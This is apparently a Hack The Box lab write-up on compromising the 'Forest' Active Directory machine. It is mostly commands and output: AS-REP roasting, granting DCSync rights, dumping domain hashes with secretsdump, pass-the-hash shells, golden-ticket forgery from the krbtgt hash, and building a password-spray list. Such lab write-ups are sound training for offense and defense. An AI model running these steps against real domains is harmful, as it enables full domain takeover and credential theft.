# Reconnaissance
- 
## Nmap Enumeration
- We pass the commands:
	```bash
nmap -sV -sC -vv 10.10.10.161
nmap -sU --top-ports=10 -vv 10.10.10.161


---OUTPUT-TCP---
PORT     STATE SERVICE      REASON          VERSION
53/tcp   open  domain       syn-ack ttl 127 (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
88/tcp   open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-18 19:39:14Z)
135/tcp  open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?    syn-ack ttl 127
593/tcp  open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped   syn-ack ttl 127
3268/tcp open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped   syn-ack ttl 127
5985/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.95%I=7%D=4/18%Time=6802A8D9%P=x86_64-pc-linux-gnu%r(DNS-
SF:SD-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04
SF:_udp\x05local\0\0\x0c\0\x01");
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h26m49s, deviation: 4h02m32s, median: 6m47s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-18T19:39:35
|_  start_date: 2025-04-18T19:37:22
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-04-18T12:39:39-07:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 32753/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 24202/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 44587/udp): CLEAN (Timeout)
|   Check 4 (port 52817/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

---OUTPUT-UDP---
PORT     STATE         SERVICE      REASON
53/udp   open          domain       udp-response ttl 127
123/udp  open          ntp          udp-response ttl 127
```
## SMB Enumeration
- smbclient doesn't give any access
- crackmapexec gives a hit on this command but gives an access denied on `--shares`
	```bash
crackmapexec smb 10.10.10.161 -u '' -p ''
crackmapexec smb 10.10.10.161 -u '' -p '' --shares

---OUTPUT-1--
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\: 

---OUTPUT-2---
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\: 
SMB         10.10.10.161    445    FOREST           [-] Error enumerating shares: STATUS_ACCESS_DENIED

```
	- Can't access shares
## LDAPSearch
- LDAP has anonymous authentication so we explore LDAP to enumerate:
	- We find DC name (although we know from nmap)
	```bash
ldapsearch -x -H ldap://10.10.10.161 -s base namingcontexts

---OUTPUT---
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=htb,DC=local
namingContexts: CN=Configuration,DC=htb,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
namingContexts: DC=DomainDnsZones,DC=htb,DC=local
namingContexts: DC=ForestDnsZones,DC=htb,DC=local
```
	- We grab the data:
		```bash
ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local"
ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local" > ldap
cat ldap| grep "password"  

---OUTPUT---
description: Servers in this group can access remote access properties of user
objectClass: user
userAccountControl: 4096
objectClass: user
userAccountControl: 532480
objectClass: user
userAccountControl: 66048
userPrincipalName: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe@htb.local
objectClass: user
userAccountControl: 66048
userPrincipalName: HealthMailboxfc9daad117b84fe08b081886bd8a5a50@htb.local
objectClass: user
userAccountControl: 66048
userPrincipalName: HealthMailboxc0a90c97d4994429b15003d6a518f3f5@htb.local
objectClass: user
userAccountControl: 66048
userPrincipalName: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8@htb.local
objectClass: user
userAccountControl: 66048
userPrincipalName: HealthMailbox968e74dd3edb414cb4018376e7dd95ba@htb.local
objectClass: user
userAccountControl: 66048
userPrincipalName: HealthMailbox6ded67848a234577a1756e072081d01f@htb.local
objectClass: user
userAccountControl: 66048
userPrincipalName: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab@htb.local
objectClass: user
userAccountControl: 66048
userPrincipalName: HealthMailboxfd87238e536e49e08738480d300e3772@htb.local
objectClass: user
userAccountControl: 66048
userPrincipalName: HealthMailboxb01ac647a64648d2a5fa21df27058a24@htb.local
objectClass: user
userAccountControl: 66048
userPrincipalName: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf@htb.local
objectClass: user
userAccountControl: 66048
userPrincipalName: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e@htb.local
objectClass: user
userAccountControl: 66048
userPrincipalName: sebastien@htb.local
objectClass: user
userAccountControl: 66048
userPrincipalName: santi@htb.local
objectClass: user
userAccountControl: 66048
userPrincipalName: lucinda@htb.local
objectClass: user
userAccountControl: 66048
userPrincipalName: andy@htb.local
objectClass: user
userAccountControl: 66048
userPrincipalName: mark@htb.local

```
- Tried some enumeration shown at the bottom
	- main find (no longer working but shown at Ippsec...still good way to enumerate):
		```bash
rpcclient -U '' 10.10.10.161
> 
> enumdomusers

---RELEVANT-OUTPUT---
svc-alfresco
```
		- We find an extra user from the users we found at ldapsearch
- finding user with no kerberos pre auth
	```bash
impacket-GetNPUsers -dc-ip 10.10.10.161 -request 'htb.local/'

---OUTPUT---
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2025-04-18 18:08:29.916678  2019-09-23 07:09:47.931194  0x410200 



/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
$krb5asrep$23$svc-alfresco@HTB.LOCAL:bbf235534c8c95a1a797c549f6906165$8bd169e1d3a0e150130daebce352d2ebc575ac4070319b41b1683e52f0859b5d13ee95e55e85fa34cf2f745543a5282721b13ab26c12067f53ae3d930443302a5a4400fabe25828020d964b2f9ff3c4723bb6c11094f9ca22d3e7671f4586906d049bd67fe6ec6ed50f124229475e310987ac85af7233736610bb995f1d4760949e6429562c97bd78175bd309077c8581f31ffe38b1fa91d7590e8eb3832cd5d4a5b0597e73219e94248a7dfe9c0a4946f37a4ef98a6f3f69e888e4fc7a0c05466fd5922a1c1eaf5a98e7c0283ba7cf4db3f0d222092c97682e20247929784cb4b67bb4ba8dc

```
## Bloodhound
- We grab the files with our credentials
	```bash

```
- ![[Pasted image 20250419124256.png]]
	- Shortest Path from Owned Principles
		- Here we see Account Operators group which is a Privileges AD group acccording the AD documentation.
			- With this we can create and modify users and add them to non protected groups
		- We also see EXCH01.HTB.LOCAL
			- We check using nslookup:
				```bash
nslookup
> server 10.10.10.161
> exch01.htb.local

---OUTPUT---
Server:         10.10.10.161
Address:        10.10.10.161#53

Name:   exch01.htb.local
Address: 10.10.10.7
Name:   exch01.htb.local
Address: dead:beef::9548:657:1098:7fdd
```
			- We try to ping it but it fails
			- This is probably a domain that used to exist and for that domain our user was given this Account Operator privileges.
	- Using this we can create a new user (or escalate our current user but since it's HTB and other users might be using it's safer to just create a new user)
		```bash
net user rocknrj rocknrj /add
net users # to check if user has been added
```
- ![[Pasted image 20250419140322.png]]
	- Shortest path to domain admin
		- here we see a group "Exchange Windows Permissions" which has write DACL privileges over HTB.LOCAL
		- We can give our user DCsync privielges over it and then grab the Administrator's hash with secretsdump
- To perform this we add our newly created user to the "Exchange Windows Permissions" group
	```bash
net group "Exchange Windows Permissions"
net group "Exchange Windows Permissions" rocknrj /add
```
- Exploit DACL rights
	```bash
impacket-dacledit -action write -rights DCSync -principal rocknrj -target-dn 'DC=htb,DC=local' htb.local/rocknrj:rocknrj
```
- Grab hashes of users:
	```bash
impacket-secretsdump htb.local/rocknrj:rocknrj@10.10.10.161

---OUTPUT---
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
...
...
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
rocknrj:10601:aad3b435b51404eeaad3b435b51404ee:113913f113c2fc56b63640e5076ec146:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:a739b6d678b1df95b220252531110759:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
...
...
...

```
	- We find the admin password hash:
		```bash
aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```
- We can psexec or winrm to target
	```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161

--OR--
evil-winrm -u administrator -H '32693b11e6aa90eb43d32c72a07ceea6' -i  10.10.10.161

---OUTPUT-PSEXEC---
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
[*] Uploading file zAHCJjEL.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service qnQM on 10.10.10.161.....
[*] Starting service qnQM.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

---OUTPUT-WINRM---
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                       
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                         
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
```
	- We grab the root flag

-------
--------
## Extras
- Ippsec video had a lot of extra content which I will add here
## Cracking all hashes
- We attempt to crack all hashes
	```bash
vi hashes # Copy hashes from secrets dump here
cat hashes| grep ::: | awk -F: '{print $1":"$4}' > hashntlm
hashcat -m 1000 --user hashntlm /usr/share/wordlists/rockyou.txt
hashcat -m 1000 --user hashntlm --show
---OUTPUT---
Guest:31d6cfe0d16ae931b73c59d7e0c089c0:
DefaultAccount:31d6cfe0d16ae931b73c59d7e0c089c0:
htb.local\$331000-VK4ADACQNUCA:31d6cfe0d16ae931b73c59d7e0c089c0:
htb.local\SM_2c8eef0a09b545acb:31d6cfe0d16ae931b73c59d7e0c089c0:
htb.local\SM_ca8c2ed5bdab4dc9b:31d6cfe0d16ae931b73c59d7e0c089c0:
htb.local\SM_75a538d3025e4db9a:31d6cfe0d16ae931b73c59d7e0c089c0:
htb.local\SM_681f53d4942840e18:31d6cfe0d16ae931b73c59d7e0c089c0:
htb.local\SM_1b41c9286325456bb:31d6cfe0d16ae931b73c59d7e0c089c0:
htb.local\SM_9b69f1b9d2cc45549:31d6cfe0d16ae931b73c59d7e0c089c0:
htb.local\SM_7c96b981967141ebb:31d6cfe0d16ae931b73c59d7e0c089c0:
htb.local\SM_c75ee099d0a64c91b:31d6cfe0d16ae931b73c59d7e0c089c0:
htb.local\SM_1ffab36a2f5f479cb:31d6cfe0d16ae931b73c59d7e0c089c0:
htb.local\svc-alfresco:9248997e4ef68ca2bb47ae4e6f128668:s3rvice
htb.local\santi:483d4c70248510d8e0acb6066cd89072:plokmijnuhbe 
```
	- 31d... is blank pwd
	- Note that it won't work without `--user` flag as the hash file incudes `username:hash`
## Golden Ticket (Krbtgt)
- Among the hashes we also have krbtgt hash.
	- We can try to exploit Golden Ticket attack
		```bash
whoami /user
--OR--
(Get-ADDomain).DomainSID
--OR--
Get-ADDomain htb.local

---OUTPUT-1---
USER INFORMATION
----------------

User Name        SID
================ =============================================
htb\svc-alfresco S-1-5-21-3072663084-364016917-1341370565-1147

---OUTPUT-2---
BinaryLength AccountDomainSid                         Value
------------ ----------------                         -----
          24 S-1-5-21-3072663084-364016917-1341370565 S-1-5-21-3072663084-364016917-1341370565

---OUTPUT-3---
AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=htb,DC=local
DeletedObjectsContainer            : CN=Deleted Objects,DC=htb,DC=local
DistinguishedName                  : DC=htb,DC=local
DNSRoot                            : htb.local
DomainControllersContainer         : OU=Domain Controllers,DC=htb,DC=local
DomainMode                         : Windows2016Domain
DomainSID                          : S-1-5-21-3072663084-364016917-1341370565
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=htb,DC=local
Forest                             : htb.local
InfrastructureMaster               : FOREST.htb.local
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=htb,DC=local}
LostAndFoundContainer              : CN=LostAndFound,DC=htb,DC=local
ManagedBy                          :
Name                               : htb
NetBIOSName                        : HTB
ObjectClass                        : domainDNS
ObjectGUID                         : dff0c71a-a949-4b26-8c7b-52e3e2cb6eab
ParentDomain                       :
PDCEmulator                        : FOREST.htb.local
PublicKeyRequiredPasswordRolling   : True
QuotasContainer                    : CN=NTDS Quotas,DC=htb,DC=local
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {FOREST.htb.local}
RIDMaster                          : FOREST.htb.local
SubordinateReferences              : {DC=ForestDnsZones,DC=htb,DC=local, DC=DomainDnsZones,DC=htb,DC=local, CN=Configuration,DC=htb,DC=local}
SystemsContainer                   : CN=System,DC=htb,DC=local
UsersContainer                     : CN=Users,DC=htb,DC=local
```
	- For output1, the 1147 is the identifier for user so the SID excludes that)
- ticketer to grab ticket
	```bash
impacket-ticketer -nthash 819af826bb148e603acb0f33d17632f8 -domain-sid S-1-5-21-3072663084-364016917-1341370565 -domain htb.local administrator

---OUTPUT---
...
datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
/usr/share/doc/python3-impacket/examples/ticketer.py:843: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in administrator.ccache
```
	- You could change the user to anything instead of administrator and it should work because we are creating our own ticket
		- What happens is since its signed by the domain the machine won't check since if its signed by the domain it must be authorized and that's how we impersonate admin. the ticket is what matters not the username we set.
- I also added forest and htb to /etc/hosts
	- why? the spn name htb.local wasn't working.
		- says something about the name not being found on the database
			- maybe the database is on the remote server.
			- The name of the box is forest so we add forest and htb (forest.htb) to /etc/hosts
- Then we add the ccache to KRB5CCNAME and attempt to use psexec to login with kerberos auth (wmiexec doesnt work, because psexec doesn't alwasys impersonate the service)
	```bash
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass htb.local/administrator@forest

---OUTPUT---
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on forest.....
[*] Found writable share ADMIN$
[*] Uploading file GTjEHiBz.exe
[*] Opening SVCManager on forest.....
[*] Creating service vmhZ on forest.....
[*] Starting service vmhZ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 

```
	- If we query user (and we enteredd a random user instead of admin during ticketer) it would respond with `No user exists for `\*\r\n` 
		- we could not use IP Addresses anywhere in the command and need FQDN for the domain.  Create entries in Host file if DNS is not there.
## Password List generation and LDAP queries
- **LDAP Queries**
	- In our LDAP search we used grep to find usernames. We can instead use queries in our LDAP search. 
		- That's actually how ldapsearch is supposed to be used.
			- You select the scope (DC=htb,DC=local) and target and then we query it to get an output
				```bash
# Dump things only with Object Class "Person"
ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local" '(ObjectClass=Person)'
# Dump things only with Object Class "Organizational Person"
ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local" '(ObjectClass=organizationalPerson)'
# Dump things only with Object Class "user"
ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local" '(ObjectClass=user)'
```
	- Can see when 
		- users were created (FORMAT : YYYY-MM-DD-HH-MM-SS), 
		- the object class
		- Successful Login Count
		- Bad Password Attempts
		- Potential email addresses
		- sAMAccountName (username) and sAMAccountType
			- Search for all sAMAccountName and sAMAccountTyoe
				```bash
ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local" '(ObjectClass=user) sAMAccountName sAMAccountTyoe > ldapquery
```
		- Password Last Set
			- Windows has a different timestamp different from epoch
				- Can read via (googled Windows timestamp to human):
					- https://www.epochconverter.com/ldap
- Since we want to do a Password Spray, to grab only the usernames:
	```bash
ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local" '(ObjectClass=Person)' sAMAccountName | grep sAMAccountName  
# Object class can be user too as output is the same here
```
	- Still need to remove the users we probably don't need (we remove machine accounts that have $ at the end as AD generates them themselves and so won't be able to crack passwords, and the accounts generated by exchange, as well as "Request" which isn't an account)
		```bash
cat ldapquery

---OUTPUT---
sebastien
lucinda
andy
mark
santi
```
- **Making a password list**
	- rockyou.txt is a huge files
		```bash
wc -l /usr/share/wordlists/rockyou.txt 

---OUTPUT---
14344392 /usr/share/wordlists/rockyou.txt
```
	- To create a pwd list add a basic list to a file (usually all the months in the year, Seasons, domain name, password itself, the year)
		```bash
cat pwdlist

---OUTPUT---
January
February
March
April
May 
June
July
August
September 
October
November
December
Password
Autumn
Summer
Winter
Fall
Spring
Forest
htb
Secret
```
	- We have about 21 passwords (`wc -l <filename>`)
- Then we add the year to the end of these words
	```bash
for i in $(cat pwdlist); do echo $i; echo ${i}2019; echo ${i}2020; done > pwdlistyear
```
	- If you want to add it to the same file do note:
		- If you cat a file an then direct the output to the top of the same file it will **erase** the entire file (Not replace but erase i.e file ill be blank)
			- So inorder to do this you would need to copy it to another file and then move that file to our file i.e
				```bash
for i in $(cat pwdlist); do echo $i; echo ${i}2019; echo ${i}2020; done > t
cp t pwdlist
```
				- Now we have 57 pwds
- Then to mutate our list with hashcat to create a variety from this list
	```bash
hashcat --force --stdoout pwdlistyear -r /usr/share/hashcatrules/best64.rule
```
	- It's missing the ! character
		```bash
# To check
hashcat --force --stdoout pwdlistyear -r /usr/share/hashcatrules/best64.rule | grep '\!'
hashcat --force --stdoout pwdlistyear -r /usr/share/hashcatrules/best64.rule | grep '!'
```
		- No output showing no ! included
- We add ! to our list:
	```bash
for i in $(cat pwdlistyear); do echo $i; echo ${i}!; done > pwdspecial
```
	- Then we pass the hashcat command
		```bash
hashcat --force --stdout pwdspecial -r /usr/share/hashcat/rules/best64.rule | wc -l 

---OUTPUT---
8778
```
		- 8778 pwd
- We can then toggle various upper cases with toggle1 rule:
	```bash
hashcat --force --stdout pwdspecial -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule
```
	- Can check pwd list number:
		```bash
hashcat --force --stdout pwdspecial -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule | wc -l

---OUTPUT---
131670
```
		- Whenever we do toggles, or we have multiple rules (maybe some of the rules in toggles1 is in best64 already), we will have duplicates so we need to sort them:
			```bash
hashcat --force --stdout pwdspecial -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule | sort -u | wc -l

---OUTPTU---
45207
```
			- Lot of passwords
- Let's keep a minimum character limit (8 or above):
	```bash
hashcat --force --stdout pwdspecial -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule | sort -u | awk 'length($0)>8' | wc -l

---OUTPUT---
30151
```
- Pipe it to a file
	```bash
hashcat --force --stdout pwdspecial -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule | sort -u | awk 'length($0)>8' > finallist
```
- Before any brute force you should check password policy so we don't lock an account out (as it could be a potential access point)
	- Can use enum4linux (not updated in a long time so not the best option)
		```bash
enum4linux 10.10.10.162
```
		- Does give more info here ( for password policy)
		- Uses polenum command
	- Can use crackmapexec:
		```bash
crackmapexec smb 10.10.10.161 --pas-pol -u '' -p ''
```
		- If threshold is 0, no policy set
		- Null authentication will generally work on a lot of domains that have been upgraded from 2003.
			- When you install a domain now, it doesn't let null authentication because back in 2003 anonymous users had this privileges
				- Also why enum4linux is working
				- because you may require the functionality so they don't remove it for compatibility when you upgrade (when you upgrade from 2003 to 2008 etc)
					- Anonymous users is in the pre windows 2000 compatibility group
						- If you remove that, it will fix this
- Another note, in rpcclient too if you do:
	```bash
rpcclient 10.10.10.161 
```
	- It will fail, but you can specify:
		```bash
rpcclient -U '' 10.10.10.161
>
```
		- It will work
	- If you do enumdomusers here, you will get a list of usernames
		- We find another use which we didn't find in ldapsearch here "svc-alfresco"
			```bash
> enumdomusers
> queryusergroups [rid-id] # to see groups user is in and we find 2
> querygroup [rid-id] # Shows domain users and service Account
> queryuser [rid-id] # shows last login, pwd last set, when pwd will change
```
			- We add it to our user list (make sure to use `>>` and not `>` as the latter will replace the file contents with simply `svc-alfresco` while the former will add it to the bottom of the list)
				```bash
echo "svc-alfresco" >> ldapquery # although no longer ldap query since we added this user, so better to save as another file
```
				- Why not shown in ldap? maybe anonymous user doesn't have access to this service account user data
- Finally we run our brute force in the background while we do other enumeration:
	```bash
crackmapexeec smb 10.10.10.161 -u userlist -p finallist
```

## BloodHound rabbit holes
- ![[Pasted image 20250419122908.png]]
	- Shortest Path from Owned Principles to Domain Admins
- ![[Pasted image 20250419123040.png]]
	- Path from svc-alfresco to administrator
- From the above two images I thought maybe I could DCSync but since I don't have admin privileges the PSRemote privilege only grants me privileges of svc-alfresco so I can't really do much with it.